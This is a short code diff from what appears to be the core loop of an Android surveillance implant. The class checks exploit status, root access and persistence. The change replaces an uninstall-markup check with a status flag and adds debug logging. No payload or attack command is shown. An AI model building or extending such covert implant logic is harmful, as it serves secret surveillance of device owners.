@@ -175,9 +175,15 @@ public class Core extends Activity implements Runnable {
 				}
 
 			}
-			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && haveUninstallMarkup() ) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): checking uninstall Markup");
+			}
+			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall ) {
 				UninstallAction.actualExecute();
 				return false;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (Start): checked uninstall Markup");
 			}
 			if (Status.haveRoot()) {
 				int perStatus = Status.getPersistencyStatus();
